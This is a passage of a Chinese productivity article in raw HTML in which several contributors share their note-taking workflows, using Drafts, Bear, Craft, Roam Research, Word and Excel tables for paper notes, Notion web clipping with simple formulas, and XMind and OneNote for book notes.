src=\"https://cdn.sspai.com/editor/u_/c4m8s7lb34tcu4buqvp0.jpeg\"></figure><p>这样，我们就把笔记系统的链接，从文字扩展到图片，从在电脑前正襟危坐，扩展到在平板上涂抹绘画。</p>\n<p>有趣的是，你所有的手写文字，备忘录都在试图识别出来。我字迹比较潦草，中文识别率并不太高，但是很多时候都能给我带来惊喜。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s8lb34tcvciqaaf0.jpeg\"></figure><p>如上图，搜「高光」二字，连这么潦草的手写记录，都对应搜了出来。</p>\n<h2>笔记的系统、记录与大融合</h2>\n<p>上述工具，你很快就能掌握，并且记下自己的灵感瞬间。但是，不要满足于此，咱们得想办法，让它们融入咱们的系统中，才能发挥卡片笔记的系统优势。下面给你介绍一下我的工作流程。</p>\n<p>先说 Drafts 。</p>\n<p>我一般会在当日对速记内容进行整理，尤其是可能有疏漏的语音录入文字。处理好一张张单独的卡片后，我会根据卡片的联系，采用 Drafts 自带的 merge 功能，把上下文相关的许多张卡片进行合并，形成一则包含多个段落的长笔记。这首先是给笔记增添一个上下文相关维度，启发未来思维激荡，同时也简化了后续的导出操作。</p>\n<p>Drafts 笔记如何汇入到 Roam Research 中呢？我们可以使用 Drafts 自带的 Action ：<code>Save md</code> 。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s8lb34tcu4buqvpg.jpeg\"></figure><p>每一则笔记，都可以输出为一个单独的 Markdown 文件，里面的文本加粗、各种链接都可以保留。然后使用 Roam Research 的批量导入 Markdown 功能，就能把它们都一股脑弄到 Roam Research 里面，进行进一步的整理操作了。</p>\n<p>你可能会脱口而出：图片怎么办？</p>\n<p>不必担心。Drafts 里面没有图片。而那些 Hook 做好的图片链接，到了 Roam 里面，不需修改，就能正常开启。</p>\n<p>下面看看备忘录的融合。</p>\n<p>苹果的备忘录这款应用，作为临时笔记的采集器，哪方面都很好——除了和其他笔记工具的协同。</p>\n<p>它不支持导出成为 Markdown 格式。其实它连富文本、HTML，乃至于私有 XML 格式导出都不支持。它只有一个 Export 选项，你猜能导出啥格式？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s8tb34tcu4buqvq0.jpeg\"></figure><p>你没看错，居然是 PDF ！</p>\n<p>这里，为了能够把备忘录里面的笔记，融入笔记系统，你就需要一个「桥梁」了。我选择的桥梁，是 Bear 。你可以从备忘录里面全选一则笔记，然后复制，到 Bear 下面粘贴。结果令人满意——图片、文字、链接，一应俱全。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s95b34tcvt9nu6r0.jpeg\"></figure><p>而 Bear 的导出选项，那可就丰富许多了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s9db34tcvt9nu6rg.jpeg\"></figure><p>我们可以导出为 Markdown 或者 Text Bundle 格式。<a href=\"http://textbundle.org/\" target=\"_blank\">Text Bundle 格式</a> 可以看作是现代化笔记应用之间交互的标准化「集装箱」。它其实并不复杂，就是把 <a href=\"https://sspai.com/post/59314\" target=\"_blank\">Markdown 文件和相关的图片打了个包</a>。但是这样一来，你在 Bear, Ulysses, Craft, Zettlr, Metion, Marked 等工具之间，都可以用这种格式方便交换数据，样式都能保持一致。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s9lb34tcuopj7s2g.jpeg\"></figure><p>只可惜，Roam Research 到目前为止，还不支持 Text Bundle 。所以，我们还是得考虑一下图片问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s9lb34tcvt9nu6s0.jpeg\"></figure><p>解决图片问题，目前有3个较为可行的方法：</p>\n<p>第一，是利用 <a href=\"https://www.craft.do/\" target=\"_blank\">Craft</a> 。Craft 可以导入 Text Bundle 。然后，你只需要拷贝当前笔记，就可以图文并茂直接贴到 Roam Research 里面。因为 Craft 把所有导入图片，都统一上传到自家的图床，都云端化了。</p>\n<p>第二，是用一款叫做 iPic Mover 的工具。它可以把一个目录下面所有 Markdown 文件里的图片，都上传到指定的图床。默认的免费图床是微博的，你也可以根据自己的需要，选择 S3, 七牛、腾讯云、阿里云等。转换之后 Markdown 文件里面全部的图片链接会自动替换为云端版本，这样可以直接批量导入 Roam Research 了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8s9tb34tcuopj7s30.jpeg\"></figure><p>第三，是自己动手，丰衣足食。例如我做了一个脚本，可以把本地目录下面全部 Text Bundle 以及 Markdown 文件，图片上传到云端，内容转换成 Roam 专用的 JSON 格式。这样导入 Roam Research 的时候更加便利。只不过，目前脚本中包含了本人图床的认证私密信息，所以暂时无法公开分享。</p>\n<p>订阅了 Bear ，只是为了导入备忘录的图文内容，导出成 Markdown ；订阅了 Craft，也只是为了上传到 Craft 图床更为便捷。看到这里，你大概能更加深刻理解什么叫「重器轻用」了吧？</p>\n<p>这不是暴殄天物、铺张浪费，而是真的为了严肃对待记笔记这个事儿。对于很多创意与灵感来说，仅仅捕捉到一个，也比订阅50年的 Bear ，都要更有价值。至于 Craft 嘛，如果你是学生，或者是学校的教职员工，可以凭借教育机构邮箱申请<a href=\"https://www.craft.do/\" target=\"_blank\">免费使用</a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sa5b34tcvciqaafg.jpeg\"></figure><p>不过，必须说明，上述工具组合，实际上都是动态调整的。假如说某天 Roam Research 和备忘录都支持了 Text Bundle 导入和导出，那么大量的中间环节，都可以被省略掉。</p>\n<h2>\n<a class=\"ss-atUser\" data-mention=\"@Sharon大橘子\" user-id=\"c1hk9mdb34teumhmui80\" href=\"https://sspai.com/u/880e395e\">@Sharon大橘子</a> 我在用的笔记工具是你无法想象的普普通通</h2>\n<p>我常用的设备就是 Windows 笔记本和 iPad，iPad 大多在外出时进行使用，所以最常用的还是 Windows 笔记本。很多好用的软件只能在 iPhone 或者 Mac 设备上使用，Windows 上可以使用作为电子笔记的软件比较少。尝试了很多软件，并且考虑到便捷性等因素之后，我选择最最常见的软件来做电子笔记，就是 Microsoft Office 里面的 Word 和 Execl。</p>\n<p>我现阶段读的最多的还是论文和某些专业书。我的需求其实很简单，可以清晰记录和标注重点，也可以大致总结。再加上我是一个怕麻烦的人，希望尽量笔记记录步骤尽量简洁，所以软件的使用越简单越好。其实 Word 的功能对于我做笔记来说已经绰绰有余了，使用步骤也比较清晰明了，所以翻来翻去，我还是使用 Word 最多。</p>\n<p>读文献的话我会精读几篇在这个领域中最最重要的，这几篇我会打印下来或者在iPad上手写笔记，这样记得更牢。那其他的研究我不能不读，全部手写笔记就会花费很多时间，如果用不常用的软件也不利于我后面查询和翻阅。</p>\n<p>下面我用自己近期在读的文献和自己做的笔记和大家分享一下，我是如何用 Word 来做电子笔记的。</p>\n<p>首先我会把 Word 的页面布局改成横板，页边距都改成 1.27 厘米。这样每一行可以容纳的字数更多一些，同一页面行数比较少，后续复看笔记的时候读起来少换行，更流畅一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sadb34tcuopj7s40.png\"></figure><p>然后我会拉一个表格，表格的列数取决于我这次读文献主要读的几项，但是一般会包括文献的作者和年份、期刊名称、主要结论或者主要发现、笔记等几项。作者和年份一般会在写论文的时候中引用该文献的时候出现，所以第一栏这样记录，方便后面写论文的时候查询该文献的笔记。</p>\n<p>「期刊名称」一栏就是记录该论文所属的期刊，记录这一栏的原因是方便我看到这篇文献所属的领域。不同领域和学科对于某一个概念的研究可能出发点不同，研究现状也会不一样。看到一篇论文所属的期刊名称在很大程度上可以了解它所属的学科或者专业方向，在梳理和引用文献的时候可以提醒自己，也帮助自己在文献综述的时候归类和溯源。主要结论和主要发现经常是一篇论文的最重要的东西，所以我专门拉出来一栏记录。</p>\n<p>「主要发现」这一栏也会提示我这篇文章的贡献，纵向对比下来就能看出来一些论文之间的关系，也方便整理这个领域的发展脉络，还提醒我文献综述中各个文章的重要性和地位。最后一栏就是我自己的笔记。我会记录一些自己对于这篇论文的思考，关于这篇文章给我的启发，以及我认为的这篇文章的不足和未来可以改善的地方。还有我也会记录一些论文中值得被标记的地方，比如在引言中突出的这篇文章的研究问题，论文的组织思路，一些构念的测量，以及实验设计的思路等等我能学习到的地方。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sadb34tcvt9nu6sg.png\"></figure><p>表中更加重要的笔记内容我会进一步用不同颜色进行区分，一般是黄色高亮是最最重要的部分，下划线是次重要的部分。如果内容还是特别多还需要区分出来的话，比如结论较多且结构较为复杂的论文，我会选择一些相近的颜色和色系来对一些内容进行区分。当然这个看个人爱好，也有很多人喜欢用对比明显的一些颜色来对笔记内容进行区分和标注。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8salb34tcuopj7s4g.png\"></figure><p>还有就是关于文献的排序。我个人是喜欢按照作者的首字母进行排序的，这样的顺序也符合我在论文中参考文献的排列顺序，也方便我回忆和查找。当然我有时候也会按照年份排序，这样可以看到这个领域最新的研究进展。也会有别的顺序，这个也是看个人习惯。</p>\n<p>每读一篇我就可以根据自己定的顺序插入一行，在读之前依次输入作者和年份以及来源期刊名称。一边读一边在笔记的那一栏进行记录。最后读完整篇论文我会记录主要发现或者主要结论，整理自己在笔记那一栏的内容。比如下图是我近期整理的关于风险感知的相关研究的笔记中的一部分。发表时间最早到 2001 年，最晚到 2021 年，涉及的领域包括医学、心理学、营销学、旅游管理等不同学科和专业。用黄色标记的是我笔记中的重点。由于风险感知相关的一些文献我之前读过不少，这次再次整理记录是为了补足我之前知识缺口，所以并没有区分次重点和其他要点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8salb34tcu4buqvqg.png\"></figure><p>当然，如果栏数比较多而且不喜欢 Word 的分页的话，可以选择 Excel 进行记录。Excel 比 Word 可以便捷地记录更多栏，也更加方便查找和筛选一些文章的年份。如果需要详细地记录一些文章的理论、自变量、因变量、实验方法等，Excel就可以在同一页面的表格中拉出来更多栏。但是大致思路和我用 Word 进行电子笔记的记录是一样的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8satb34tcvciqaag0.png\"></figure><p>以上就是我关于电子笔记的一些分享，欢迎大家一起交流！</p>\n<h2>\n<a class=\"ss-atUser\" data-mention=\"@桌沿奇思\" user-id=\"bs2per5b34tcs0poelh0\" href=\"https://sspai.com/u/379wzx2e\">@桌沿奇思</a> 我用 Notion 解决「稍后老不读」、「读了老是忘」的烂毛病</h2>\n<p>知乎上有一个有趣的问题——「稍后阅读，稍后真的会阅读吗？」，最高赞的回答也十分风趣：「这个问题好，我稍后回答。」</p>\n<p>曾几何时，各种「稍后读」工具层出不穷，试图解决我们的信息焦虑。但是，当我们看着相关工具里的文章像是滚雪球一样越积越多，我们只会变得愈发焦虑，而非享受咀嚼、消化新知识的愉悦感。</p>\n<p>显然，稍后读工具的初衷是善良、积极的，但是我们在使用它们的时候，产生了一个明显却常常不自知的误区：我们认为只要开始使用这些工具，自己不用作出任何调整，就能够一劳永逸的解决文章「没时间阅读」、「读了忘得快」等难题。</p>\n<p>殊不知，工具永远只是工具，正确的目的和方法论才是激发工具效力的正确打开方式。能够有效配合目的和方法论的任何工具，都是好工具。</p>\n<h3>放弃幻想，脚踏实地</h3>\n<p>当走得太远，我们便常常忘记我们为什么出发。同理，当折腾工具太久，我们便常常忘记我们为什么需要他们。稍后读的内核永远不会是「稍后」，而是「读」。我们的目的，始终是希望自己能够阅读这些文章，才会将它们暂时存储在工具中。而阅读，必定会消耗我们一定的时间和精力。</p>\n<p>因此，不要只是寄希望于下载某个软件来帮助自己，而是应该提前规划好每天、每周自己有多少时间来消化这些文章，然后再去寻找适合自己的软件来帮助自己管理文章，才应该是打败「稍后不再读」的第一步。</p>\n<p>因此，不妨现在就做一个简单的思考——我一天之中到底有多少闲暇时间用来阅读这些文章，放到一周之中又有多少时间？不仅仅是大片的闲暇时间，通勤、排队、走路（可以让Siri朗读文章）、独自吃饭等零碎时间，都可以纳入其中。</p>\n<h3>为什么选择 Notion：输入与输出的大一统</h3>\n<p>不选择 Pocket、Instapaper 等老牌专业稍后读工具，主要在于「割裂感」。互联网文章再好，归根结底也只是知识的一种载体。因此，我们是如何学习来自课堂、书本的知识，我们就应该同样对待互联网文章中蕴含的知识——当然，前提是这些文章较为优质。</p>\n<p>一方面，我们习惯于不重视互联网文章，却又离不开它们，觉得几天不看，好像自己就与世界割裂了。因此，我们常常流于「扫读」，不会「精读」，很少甚至几乎不可能「反复阅读」。另一方面，使用其他工具进行笔记摘抄、学习记录，会与我们已有的笔记体系割裂开来。对于我这个主要使用电子笔记的人，这会带来迁移笔记的麻烦，浪费时间和精力。</p>\n<p>因此，自从 Notion 上线网页剪藏功能后，我便开始使用 Notion 来进行互联网文章管理。</p>\n<p>以上只是我选择 Notion 的第一点原因。更重要的原因，在于 Notion 的便利、分类管理和汇总统计。为了更清晰地阐明我的方法，我将将「我是如何储存、消化和转化一篇互联网文章」的完整流程，结合 Notion 的优点展示给你看。</p>\n<h3>储存，便利剪藏</h3>\n<p>什么时候我们会用到稍后读功能？显然，在我们当下没时间阅读的时候。因此，如果剪藏功能不能在做到足够便利，那么我们很难长久坚持使用它。</p>\n<p>Notion 自然不存在类似问题，在电脑浏览器上，通过两次点击即可完成剪藏。在手机上，以 iPhone 为例，与分享内容给朋友的操作步骤几乎一样，仅需三次点击。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sb5b34tcvciqaagg.png\"><figcaption>Notion 桌面端浏览器剪藏</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/dcb4200ece97e14081d1409fa5c6b863.png\"><figcaption>在 iOS 中用 Notion 剪藏网页</figcaption></figure><p>剪藏后，Notion 会自动在你选择的目标数据库（database）中添加一条数据，包含页面名称和页面网址（url）。另外，对于 Notion 服务器能抓取到的网页内容，Notion 会自动储存进该页面中。但是很可惜，对于境内大部分网页而言，无论是微信公众号还是少数派，Notion 都无能为力，如果你想储存文章内容，那么只能靠你手动复制粘贴了。</p>\n<p>其实，曾经的我也非常在意稍后读软件能不能把网页全文自动复制并储存到软件内部，以避免之后网页失效或文章删除等意外事故。但是后来发现，自己阅读的文章类型几乎不会发生类似事件，更重要的是，我还是喜欢网页文章原来的排版风格（在这里怒夸少数派），而非很多稍后读软件自带的九十年代土味排版风格。</p>\n<p>除了剪藏体验外，Notion 的阅读体验也同样流畅。</p>\n<p>打开文章库，只需要找到自己想浏览的文章，点击旁边对应 URL 上的链接符号「🔗」，Notion 便会打开对应网页。如果稍后会使用 Notion 做其他事情，那不妨点击右下角的浏览器跳转到 Safari 进行阅读。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8scdb34tcuopj7s5g.png\"></figure><h3>消化，费曼技巧</h3>\n<p>斗转星移，现在的我们坐在地铁通勤的路上，人潮挤挤，不妨掏出手机阅读之前暂存的文章吧。</p>\n<p>互联网文章，诚然也是知识的重要载体，但因其处于互联网信息洪流之中，加之整个互联网信息良莠不齐的背景，我们很难对互联网文章和作者产生高度的尊重和认同。在我们决定阅读和学习一篇文章的时候，我们应该做的是判断这篇文章值不值得我们花时间和精力去阅读。如何识别文章优劣，已经另行一文了，这里不做赘述。</p>\n<p>「阅读状态」，我分为「已经读完、值得复读、暂存实用、已被丢弃」五大类。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sctb34tcuopj7s60.png\"></figure><p>乔布斯曾经的一句话让我深以为然：重要的不是决定要做什么，而是决定不做什么。因此，最重要的一类，或许是「已被丢弃」这个文章垃圾桶。为什么说它重要，是因为这能节省我们宝贵的时间，避免浪费时间在阅读低质量的文章上。一旦你在扫读一遍或浏览前几段后，认为这篇文章质量不高、排版很烂或与自己严重不相关，那就大胆地直接把它「扔」进垃圾桶里吧！</p>\n<p>什么，你很担心错过哪篇重要的文章？其实，这只不过是现代人的信息焦虑在作祟，我将我派付费栏目「<a href=\"https://sspai.com/series/73/list\" target=\"_blank\">高效信息管理术 2.0</a>」中的这段话送给你：</p>\n<blockquote><p>那些你没有处理的信息，也并不意味着永远失去了它们。它们也已经纳入到了你的个人信息数据库中，具备被检索到的可能性。在未来的日子，当你需要完成某一项工作，开启一项系统的主题阅读，搜索某个关键词，那些还没有时间被认真阅读的文章就会被你重新唤醒，也许能给你最意想不到的惊喜。真正有价值的信息可能会迟到，但永远不会缺席，放下对「读完」的执念，用新的观念和方法拥抱这个快速迭代的数字时代吧。</p></blockquote>\n<p>其次，是「值得复读」。读完一遍后觉得很爽很过瘾，或者觉得很有用的文章，都可以打上这个标签。「已被读完」，则是无功无过还不错的文章。「暂存实用」则是一些现阶段用不上，但是感觉自己以后会用上、管他三七二十一先剪藏了再说的文章，比如装修、维权等文章。</p>\n<p>到这里，你只完成了第一步。最重要的步骤才刚刚开始。既然不是无用文章，那我们便可以开始阅读了。</p>\n<p>我在阅读的时候主要会采用费曼学习法，即用自己的话复述一遍重要信息，并把笔记直接记录到对应单元格「费曼技巧」里。这样也方便我后期在复盘文章的时候，进行文章重点的快速浏览。当然，如果时间充裕的话，能够模拟将这篇文章以教的形式复述给别人，会达到更佳的学习效果。</p>\n<p>这个过程，实际上就是在用系统化、固定化的方式，通过进行简单的分类和笔记记录，倒逼自己对有用的互联网文章进行真实的阅读、知识梳理和复盘。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sd5b34tcu4buqvrg.png\"></figure><p>读完后，我还会对文章内容进行简要的主题、体裁分类和快速评价，便于后期我对某一主题的文章感兴趣的时候，能够快速查阅到。</p>\n<h3>汇总，成就满满</h3>\n<p>能够有所记录和追踪的日子，总是让我安心不少。尤其对于阅读这件事而言，看完一本书忘掉一本、读完一篇文章忘掉一篇，实在是让我觉得很头痛。还好，Notion 也能帮到这一点。</p>\n<h4>视图功能</h4>\n<p>在我自己的阅读数据库里，我主要分为五类表格：未读文章库、最近添加的文章库、值得复读的文章库、全部文章库和辣鸡文章库。这些表格之间通过不同的筛选器（filter）和排序规则（sort）进行自动区分。在这里也分享一下我的分类规则。</p>\n<p>未读文章库的规则是，筛选：尚未打上状态标签的文章，排序：按剪藏天数最小到最大。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sddb34tcvt9nu6tg.png\"></figure><p>最近添加的文章库的规则是，筛选：最近一个月的新增文章，排序：按剪藏天数最小到最大。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sdlb34tcuopj7s6g.png\"></figure><p>值得复读的文章库的规则是，筛选：状态为「值得复读」的文章，排序：按主题和体裁排序。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sdtb34tcvciqaah0.png\"></figure><p>全部文章库的规则是，筛选：状态不是「已被丢弃」的文章，排序：按主题和体裁排序。解释一下为什么既然是全部文章，为什么还会有筛选规则，是因为我认为既然已经单独设置了辣鸡文章库，那么「全部文章库」里就不再需要它们的出现了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sedb34tcvciqaahg.png\"></figure><p>辣鸡文章库的规则是，筛选：状态为「已被丢弃」的文章，排序：无。</p>\n<p>Notion 在不同视图之间数据的无缝切换，是我认为 Notion 最厉害的创新之一。虽然 Notion 提供了丰富的视图类型，但是，如你所见，我主要使用的还是表格视图（Table view）。当然，如果你喜欢其他视图，你可以随时更改，毕竟 Notion 中的视图模式和筛选、排序规则不相冲突。</p>\n<h4>函数功能</h4>\n<p>显然，如果我们仅仅只是读完了，或者读了几遍，可能还是差那么点味道。Notion 的数据库，厉害就厉害在集成了类似 Excel 的实用功能。</p>\n<p>比如，「来源」一栏，由下列函数（formula）自动判断并显示文章的来源网站。你也可以通过更改每一行第二个和第三个引号中的内容，来增加自己常读的网站。</p>\n<pre class=\"language-plain text\"><code>if(contains(prop(\"URL\"), \"sspai\"), \"少数派\", if(contains(prop(\"URL\"), \"weixin\"), \"公众号\", if(contains(prop(\"URL\"), \"weibo\"), \"微博\", if(contains(prop(\"URL\"), \"bilibili\"), \"B站\", if(contains(prop(\"URL\"), \"zhihu\"), \"知乎\", \"others\")))))</code></pre>\n<p>比如，「剪藏天数」一栏，显示了这篇文章已经剪藏了多久，等待着如同陈年好酒一般的发酵。这个函数调用了一个被我隐藏的、自动生成的属性「创建日期」（Created time）。</p>\n<pre class=\"language-plain text\"><code>dateBetween(now(), prop(\"创建日期\"), \"days\")</code></pre>\n<p>再比如，「文章名」这一列的最下方有一个数据汇总，显示了我当前页面一共有多少篇文章。如果是在「全部文章」页面，自然就是从古至今我一共剪藏的文章数量，目前是 270+ 篇文章。而如果是「未读文章」页面，自然就是等待着我临幸的文章数量了，目前又双叒叕囤了 66 篇，留待我慢慢消化。</p>\n<h3>开始你的囤货，也开始你的阅读</h3>\n<p>在软件支持方面，在电脑端，Notion 的剪藏功能已支持 Chrome（包含 Edge 等使用 Chromium 内核的浏览器）、Firefox、Safari 等主流浏览器。在移动端，只要安装有Notion客户端，在任意浏览器都可以将页面分享到 Notion 进行剪藏。这意味着无论你是 Windows 还是 macOS 用户，iPhone 或者安卓用户，你都可以无缝、流畅体验 Notion 的剪藏功能。想要了解更多信息，你可以在<a href=\"https://www.notion.so/Web-Clipper-ba54b19ecaeb466b8070b9e683c5fce1\" target=\"_blank\">Notion 的官方页面</a>查询到适合你设备的下载或使用方式。</p>\n<p>世上无难事，只怕有心人。有心的人，不仅会有目标，也会去寻找适合自己和自己的目标的方法。同样的，任何事物都有两面性，不必因噎废食，我们只要能根据自己的需求，攫取到互联网文章的优势，就足够了。让互联网的便利、速度和有趣来帮助自己，而非让其垃圾资讯、无聊娱乐来干扰我们，这或许是信息时代公民的新必修课。</p>\n<p>希望你能享受互联网文章的乐趣，祝你阅读愉快！</p>\n<h2>\n<a class=\"ss-atUser\" data-mention=\"@前进鲨鱼\" user-id=\"bs2pf85b34tcs0poigpg\" href=\"https://sspai.com/u/qianjinshayu\">@前进鲨鱼</a> 我爱读书，所以我需要更高效的读书笔记</h2>\n<p>提到读书笔记这件事，我个人认为阅读的喜好、兴趣，甚至连阅读的方式都是很私人的一件事情，更别提每个人写读书笔记的方式了。</p>\n<p>数了一下，截止到 2021 年的 8 月，这大半年我一共读了 70 多本书，跟往年的阅读状态差不多。今年写读后感的读书笔记较少，平日里大多数时间都是在摘句中记录下自己的阅读感受。我喜欢在那些打动过自己的作品下认真做读书笔记，并坚信这些笔记会在日后时间的洗涤和发酵中焕发出新的能量。</p>\n<p>我个人认为，如果读完一本书，没有收获新的视角和观点，无法用自己的语言表达书中的观点，也没有真正实践过书中的内容，等于白看。我似乎把读书这件事描述得十分功利化，但身处在一个信息轰炸的时代，阅读书籍的途径暴增，我们可能读过很多书，但是书中记住的内容，收获的知识可能强差人意，找到适合自己的读书笔记显得尤为重要。</p>\n<p>信息时代，做读书笔记可以帮我们汲取书中有价值的信息和引导我们塌实地理解吸收和应用书中的知识。接下来，我想分享一下我的电子读书笔记整理术。</p>\n<h3>手写笔记 vs 电子笔记</h3>\n<p>无论是哪种类型的读书笔记，最终还是得看自己的学习习惯。读书笔记原本就是一件纯粹又简单的事情，不必复杂化，更不必模式化，不要只流于表面的形式，更不要为自己额外增加繁复的操作。简单来说，我们需要做有效率和实用的读书笔记而不是仅有观赏性的读书笔记。</p>\n<p>找到适合自己的笔记方式，对之后的阅读会很有帮助。在宝贵的阅读时间里把读书笔记做到极致，就需要有的放矢，寻找到适合自己的读书笔记法。</p>\n<p>在手写笔记和电子笔记中，我个人比较推荐电子笔记，因为它相对来说更方便记录和查看，并且灵活性非常高，而打字的过程就是一个记忆的过程。手写笔记的缺点则很明显，耗时耗力，需要先把内容过一遍才好「布局」，否则笔记凌乱自己也不愿再看。而且知识都是分散的，逻辑层次感不强，不利于从整体的角度把握知识。</p>\n<p>牢记一个原则：读书笔记是给自己看的，不管是手写笔记还是电子笔记，都只是一个工具，只要能帮助我们把知识整理归纳，便于查看，即：达到目的就好。</p>\n<h3>读书笔记到底记什么</h3>\n<ol>\n<li>记下书中的核心论点以及补充应用形式。假设自己在读完这本书之后需要跟老板/下属/同学/朋友讲解，那么每一章的重点是什么？哪些是必须要摘抄下来的内容？</li>\n<li>记录书中的核心论述逻辑。可以试试用最简单的流程图来记录关键的论据。</li>\n<li>记录书中自己觉得有道理的地方。这些笔记往往和自己过去的经历产生共鸣，可以将相对应的经历记录下来。哪些是我们觉得特别受用的？</li>\n<li>记录书中自己觉得有问题的地方。并不需要担心如何解决，把问题记录下来，可以之后再去研究。这里面有哪些可以作为素材和资料的？</li>\n</ol>\n<h3>读书笔记法之思维导图</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8selb34tcvt9nu6u0.jpeg\"><figcaption>我主要用 XMind 作为思维导图工具</figcaption></figure><p>并不是所有书籍都适合使用思维导图，我一般在读阅读专业书籍或者某些主题的书籍的时候都会使用思维导图。我目前正在使用 XMind 这款软件进行思维导图读书笔记法。XMind 本身就提供各种主题模板，所以实际操作起来十分简单。XMind 还可以一键生成大纲版，当我们做完思维导图后，大纲版也会随着形成，我们可以直接使用大纲版回顾整体。</p>\n<p>要判断正在阅读的书籍是否适用思维导图，有以下的办法：</p>\n<ol>\n<li>阅读书名和序，了解主题和作者的意图</li>\n<li>研究目录，概括性理解这本书的基本架构</li>\n<li>粗略浏览每章节的开头和结尾</li>\n</ol>\n<p>具体操作：</p>\n<ol>\n<li>先浏览这本书的目录，目录就是整本书的框架，因此我们根据目录就可以直接划分出本书的知识点的分支，另外在自行判断是否需要添加自己补充进去的分支。</li>\n<li>专业书籍的书名即里面围绕的内容，直接在思维导图的中间写上本书的名字。如果书籍的书名并没有指明书籍内容，我们则需要在粗略翻阅书籍后做出判断，自己总结书籍的主题。</li>\n<li>根据书籍的目录总结一下书籍内容分为哪几个知识点，并把这些知识点作为分支画出来。</li>\n<li>一个分支一个分支的学习。从第一个分支开始，翻到分支所处的页面，判断这一个大的内容下面有多少需要记录的小知识点，随后把这个大分支画出若干个小分支，每个小分支就是每个小的知识点。自己大概看一下这个知识点的全部内容，然后用一句简短的话来总结概括，并写在小分支后面。</li>\n<li>边阅读边完成整个思维导图。</li>\n<li>在完成思维导图后，可以在导图笔记的角落标注书名、作者、日期以及关键词。日后当我们需要整理思维导图的笔记的时候，就可以直接按照关键词和日期来整理。</li>\n</ol>\n<p>在做笔记的过程中，我们一定要明确哪些地方要精读，哪些地方要略读。临近的分支一定要用颜色来区分，否则分支太多很难辨别。复习的时候，可以打开一个新的思维导图，从最重要的知识点开始，完全按记忆写出整个思维导图，写完全部结束之后，再检查一下自己有多少东西是遗漏的，有多少东西是遗忘的。</p>\n<h3>读书笔记法之纯摘抄</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8setb34tcuopj7s70.jpeg\"></figure><p>纯摘抄读书笔记法适合大家单纯摘抄书籍中所受到启发的句子。这类型的笔记我通常会直接在 Microsoft OneNote 上完成，免费、强大的编辑功能、自由布局的几大特点是其他软件无法代替的。在我们建立好笔记本后，可以分为：分区组-分区-页面-子页，可以直接用来搭建个人的知识体系。</p>\n<p>虽然我把这个读书笔记法称作为纯摘抄，但是在大部分的情况下，我都不会单单对一本书的内容进行纯摘抄，我有自己的摘抄规则。</p>\n<p>具体操作：</p>\n<ol>\n<li>将自己喜欢的段落复制粘贴下来。</li>\n<li>思考如何实践段落里的内容，我一般习惯在摘抄的原文段落后面补充自己可以在下次写作中的什么话题中使用这个知识点。</li>\n<li>补充摘抄段落里的具体解释，有些自己喜欢的句子在书里并没有附上详细解释的时候，我会习惯性用自己的想法给某个概念冠上属于自己的、新的解释，以至于可以帮助我更好得去理解。</li>\n<li>添加更多的新内容，在纯摘抄笔记的后面，我会根据这个段落的内容，继续表达我自己对此的观点。</li>\n</ol>\n<p>当我们读过更多的书，再回来看书评笔记时，可能会有新的想法需要添加进去，或者是注意到之前忽略的知识点内容，这个时候电子笔记则可以很轻松将内容进行添加或者补充。除了以上三种情况，我有时候会在做笔记时试着把自己的想法与作者的语言相结合，模仿书中作者的强调语气及行文风格，这种「偷梁换柱」的方法可以促进我们更加投入去了解作者在书中所想表达的内容。</p>\n<h3>读书笔记法之书评</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sf5b34tcvciqaai0.jpeg\"></figure><p>书评读书笔记就是当我们在看完一本书之后把自己想说的话全部写出来。我个人认为只要是自己有感而发的书籍都应该立即写书评。</p>\n<p>同样的，我习惯用 Microsoft OneNote 